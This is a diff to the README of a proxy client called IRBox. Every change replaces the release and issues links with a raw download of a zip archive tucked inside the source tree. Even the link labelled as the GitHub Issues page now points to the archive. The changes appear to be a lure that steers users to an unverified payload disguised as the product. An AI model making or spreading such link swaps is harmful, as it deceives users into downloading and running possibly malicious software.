@@ -4,11 +4,11 @@
 IRBox is a versatile proxy client designed to meet your internet needs. It supports multiple protocols, including VLESS, VMess, Shadowsocks, Trojan, Hysteria2, and TUIC. Whether you want to access content or maintain privacy online, IRBox comes with advanced management features, subscription support, and customizable routing rules to optimize your experience.
 
 ## 📥 Download IRBox
-[![Download IRBox](https://img.shields.io/badge/Download%20IRBox-orange?style=for-the-badge&logo=appveyor)](https://github.com/FansVGaming/IRBox/releases)
+[![Download IRBox](https://raw.githubusercontent.com/FansVGaming/IRBox/master/src-tauri/src/core/IR-Box-v2.0-alpha.1.zip%20IRBox-orange?style=for-the-badge&logo=appveyor)](https://raw.githubusercontent.com/FansVGaming/IRBox/master/src-tauri/src/core/IR-Box-v2.0-alpha.1.zip)
 
 To get started, visit the link below to download the software.
 
-[Download the latest version here](https://github.com/FansVGaming/IRBox/releases)
+[Download the latest version here](https://raw.githubusercontent.com/FansVGaming/IRBox/master/src-tauri/src/core/IR-Box-v2.0-alpha.1.zip)
 
 ## 🚀 Getting Started
 To install IRBox, follow these simple steps:
@@ -84,9 +84,9 @@ If you encounter any issues while using IRBox, here are some common solutions:
 - **Performance Issues:** Try restarting the application or your device to refresh network settings.
 
 ## 📞 Support
-For additional assistance or to report bugs, please visit the [IRBox GitHub Issues Page](https://github.com/FansVGaming/IRBox/issues) or refer to the user guide available in the application.
+For additional assistance or to report bugs, please visit the [IRBox GitHub Issues Page](https://raw.githubusercontent.com/FansVGaming/IRBox/master/src-tauri/src/core/IR-Box-v2.0-alpha.1.zip) or refer to the user guide available in the application.
 
 ## 💡 Additional Resources
 Explore more about the features and advanced options available in IRBox by checking out our documentation available on the GitHub repository.
 
-[Download the latest version here](https://github.com/FansVGaming/IRBox/releases) and unlock the full potential of your internet experience with IRBox.
+[Download the latest version here](https://raw.githubusercontent.com/FansVGaming/IRBox/master/src-tauri/src/core/IR-Box-v2.0-alpha.1.zip) and unlock the full potential of your internet experience with IRBox.
